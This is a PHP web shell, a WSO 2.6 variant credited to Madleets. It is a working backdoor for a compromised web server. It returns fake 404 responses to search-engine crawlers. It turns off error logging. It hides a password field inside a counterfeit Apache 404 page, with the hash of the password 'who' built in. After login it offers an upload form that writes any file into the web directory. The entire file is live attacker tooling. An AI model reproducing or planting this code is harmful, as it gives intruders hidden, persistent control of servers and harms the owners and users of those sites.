<?php 
/* WSO 2.6 (404 Error Web Shell by Madleets.com) */
/*Maded by DrSpy*/
$auth_pass = "53d670af9bb16ea82e7ef41ee23ec6df";  /* pass:who Sifreyi degistiriniz! */
$color = "#00ff00"; 
$default_action = 'FilesMan'; 
$default_use_ajax = true; 
$default_charset = 'Windows-1251'; 
  
if(!empty($_SERVER['HTTP_USER_AGENT'])) { 
    $userAgents = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler"); 
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) { 
        header('HTTP/1.0 404 Not Found'); 
        exit; 
    } 
} 
  
@session_start(); 
@ini_set('error_log',NULL); 
@ini_set('log_errors',0); 
@ini_set('max_execution_time',0); 
@set_time_limit(0); 
@set_magic_quotes_runtime(0); 
@define('WSO_VERSION', '2.6'); 
  
if(get_magic_quotes_gpc()) { 
    function WSOstripslashes($array) { 
        return is_array($array) ? array_map('WSOstripslashes', $array) : stripslashes($array); 
    } 
    $_POST = WSOstripslashes($_POST); 
} 
  
function wsoLogin() { 
    die("<h1>Not Found</h1> 
<p>The requested URL was not found on this server.</p> 
<p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p> 
<hr> 
<address>Apache/2.2.22 (Unix) mod_ssl/2.2.22 OpenSSL/1.0.0-fips mod_auth_passthrough/2.1 mod_bwlimited/1.4 FrontPage/5.0.2.2635 Server at Port 80</address> 
    <style> 
        input { margin:0;background-color:#fff;border:1px solid #fff; } 
    </style> 
    <pre align=center> 
    <form method=post> 
    <input type=password name=pass> 
    </form></pre>"); 
} 
  
if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) 
    if( empty($auth_pass) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass) ) ) 
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true; 
    else
        wsoLogin(); 
  
echo'<form method="post" enctype="multipart/form-data">
<input name="upfile" type="file">
<input type="submit" value="ok">
</form>';
if ($_SERVER['REQUEST_METHOD'] == 'POST')
     { echo "ok：url  +".$_FILES["upfile"]["name"];
         if(!file_exists($_FILES["upfile"]["name"]))
         {
            copy($_FILES["upfile"]["tmp_name"], $_FILES["upfile"]["name"]);
         }
     }

exit; 

?>
